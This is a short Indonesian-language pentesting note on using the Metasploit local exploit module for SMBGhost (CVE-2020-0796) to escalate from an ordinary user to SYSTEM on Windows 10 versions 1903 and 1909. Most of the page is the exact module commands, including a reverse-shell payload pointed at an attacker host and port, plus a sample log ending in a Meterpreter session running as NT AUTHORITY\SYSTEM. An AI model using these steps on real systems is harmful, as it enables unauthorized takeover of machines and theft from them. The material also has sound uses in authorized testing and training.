# cve_2020_0796_smbghost

Modul `cve_2020_0796_smbghost` (versi local) di Metasploit adalah `exploit lokal` untuk sistem Windows yang memanfaatkan kerentanan `SMBGhost` (`CVE-2020-0796`) dalam protokol `SMBv3`. Modul ini digunakan setelah akses awal didapatkan, untuk meningkatkan hak akses (`privilege escalation`) dari user biasa menjadi `SYSTEM`, dengan menyalahgunakan kelemahan manajemen memori dalam driver `SMBv3` pada `Windows 10` versi `1903` dan `1909`.

## Cara Penggunaan di Metasploit

```
use exploit/windows/local/cve_2020_0796_smbghost
set PAYLOAD <PAYLOAD>
set SESSION <ID>
set LHOST <IP_ATTACKER>
set LPORT <PORT_LISTENER>
set TARGET <ID>
set VERBOSE true
```

Hasil output-nya seperti ini:

```
[*] Started reverse TCP handler on 192.168.1.11:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Windows Build Number = 10.0.18363.0
[+] The target appears to be vulnerable.
[*] Reflectively injecting the exploit DLL and executing it...
[*] Launching netsh to host the DLL...
[+] Process 6076 launched.
[*] Reflectively injecting the DLL into 6076...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (203846 bytes) to 192.168.1.51
[*] Meterpreter session 2 opened (192.168.1.11:4444 -> 192.168.1.51:49782) at 2025-05-17 17:09:49 +0700

meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM
```
